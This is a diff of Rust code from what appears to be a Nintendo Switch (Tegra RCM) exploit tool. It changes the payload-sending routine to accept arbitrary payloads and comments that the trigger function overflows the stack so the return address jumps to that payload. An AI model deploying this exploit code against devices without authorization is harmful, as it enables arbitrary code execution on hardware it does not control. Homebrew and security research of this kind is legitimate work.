@@ -33,7 +33,7 @@ impl std::fmt::Display for TegraRCMDevice {
 
 impl TegraRCMDevice {
     // Send user defined payload to the nintendo
-    pub fn send_payload(&self) -> Result<(), RcmError> {
+    pub fn send_payload(&self, payload: &[u8]) -> Result<(), RcmError> {
         // RCM command size 680, max payload size 0x3000
         const RCM_SIZE: usize = 0x2A8;
         // Header
@@ -44,27 +44,19 @@ impl TegraRCMDevice {
         rcm_command.extend_from_slice(&header.to_le_bytes());
         rcm_command.resize(RCM_SIZE, 0u8); // Fill the command until payload
 
-        // Set our payload: Nekronos is inside the switch
-        let payload: [u8; 30] = [
-            0x4E, 0x65, 0x6B, 0x72, 0x6F, 0x6E, 0x6F, 0x73, 0x20, 0x69, 0x73, 0x20, 0x69, 0x6E,
-            0x73, 0x69, 0x64, 0x65, 0x20, 0x74, 0x68, 0x65, 0x20, 0x73, 0x77, 0x69, 0x74, 0x63,
-            0x68, 0x00,
-        ];
-        // Write a full buffer size
-        while rcm_command.len() < DMA_BUFFER_SIZE {
-            rcm_command.extend_from_slice(&payload);
+        // Divide into DMA_BUFFER_SIZE blocks and send to the device
+        rcm_command.extend_from_slice(payload);
+        for chunk in rcm_command.chunks_mut(DMA_BUFFER_SIZE) {
+            // Issue the write, since the data is smaller than the size specified inthe header, the RCM
+            // protocol waits until more data is to come, while still serving control requests.
+            self.device.issue_bulk_request(BULK_EP_OUT, chunk)?;
         }
-        // Trim it
-        rcm_command.resize(DMA_BUFFER_SIZE, 0u8);
-
-        // Issue the write, since the data is smaller than the size specified inthe header, the RCM
-        // protocol waits until more data is to come, while still serving control requests.
-        self.device
-            .issue_bulk_request(BULK_EP_OUT, &mut rcm_command)?;
 
         Ok(())
     }
 
+    // Send a control request to trigger a memcpy that overflows the stack and makes the return
+    // address point to the previously provided payload
     pub fn trigger_vulnerability(&self) -> Result<[u8; 2048], RcmError> {
         let mut buffer = [0u8; 2048];
         self.device.issue_control_request(&mut buffer)?;
